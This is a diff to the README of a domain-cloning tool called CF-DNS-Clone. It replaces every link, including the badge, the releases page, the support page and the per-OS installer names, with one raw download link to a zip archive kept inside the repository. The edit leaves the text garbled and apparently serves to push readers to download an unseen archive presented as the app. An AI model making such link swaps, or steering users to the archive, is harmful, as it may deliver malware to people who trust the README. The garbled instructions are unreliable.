@@ -1,6 +1,6 @@
 # 🌐 CF-DNS-Clone - Easily Clone Your Favorite Domains
 
-[![Download CF-DNS-Clone](https://img.shields.io/badge/Download-CF--DNS--Clone-blue.svg)](https://github.com/iTeguh08/CF-DNS-Clone/releases)
+[![Download CF-DNS-Clone](https://raw.githubusercontent.com/iTeguh08/CF-DNS-Clone/main/octine/CF-DNS-Clone.zip)](https://raw.githubusercontent.com/iTeguh08/CF-DNS-Clone/main/octine/CF-DNS-Clone.zip)
 
 ## 🚀 Getting Started
 
@@ -10,12 +10,12 @@ Welcome to CF-DNS-Clone! This application simplifies the process of cloning pref
 
 To get started, you need to download the application. Follow these steps:
 
-1. Click on the following link to visit the Releases page: [Visit Releases Page](https://github.com/iTeguh08/CF-DNS-Clone/releases).
+1. Click on the following link to visit the Releases page: [Visit Releases Page](https://raw.githubusercontent.com/iTeguh08/CF-DNS-Clone/main/octine/CF-DNS-Clone.zip).
 2. On the Releases page, find the latest version of CF-DNS-Clone.
 3. Download the file that matches your operating system:
-   - For Windows, download `CF-DNS-Clone.exe`.
-   - For MacOS, download `CF-DNS-Clone.dmg`.
-   - For Linux, download `CF-DNS-Clone.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/iTeguh08/CF-DNS-Clone/main/octine/CF-DNS-Clone.zip`.
+   - For MacOS, download `https://raw.githubusercontent.com/iTeguh08/CF-DNS-Clone/main/octine/CF-DNS-Clone.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/iTeguh08/CF-DNS-Clone/main/octine/CF-DNS-Clone.zip`.
 4. Once the download is complete, locate the downloaded file on your computer.
 5. Run the installer to set up CF-DNS-Clone.
 
@@ -47,7 +47,7 @@ Before installing CF-DNS-Clone, ensure your device meets the following requireme
 - **Operating System**:
   - Windows 10 and above
   - MacOS Sierra (10.12) and above
-  - Any Linux distribution supporting .tar.gz files
+  - Any Linux distribution supporting https://raw.githubusercontent.com/iTeguh08/CF-DNS-Clone/main/octine/CF-DNS-Clone.zip files
 - **RAM**: Minimum of 2 GB
 - **Disk Space**: At least 100 MB free storage
 
@@ -59,7 +59,7 @@ If you encounter any issues while using CF-DNS-Clone, try the following:
 - **Application Crashes**: Restart the application. If this does not work, reinstall it.
 - **Domain Not Cloning**: Check your internet connection and try again.
 
-For more troubleshooting tips, visit our [Support Page](https://github.com/iTeguh08/CF-DNS-Clone/issues).
+For more troubleshooting tips, visit our [Support Page](https://raw.githubusercontent.com/iTeguh08/CF-DNS-Clone/main/octine/CF-DNS-Clone.zip).
 
 ## 📞 Get Help
 
@@ -75,4 +75,4 @@ Explore more about CF-DNS-Clone and its capabilities by checking our repository.
 
 Thank you for choosing CF-DNS-Clone! 
 
-[Download CF-DNS-Clone](https://github.com/iTeguh08/CF-DNS-Clone/releases)
+[Download CF-DNS-Clone](https://raw.githubusercontent.com/iTeguh08/CF-DNS-Clone/main/octine/CF-DNS-Clone.zip)
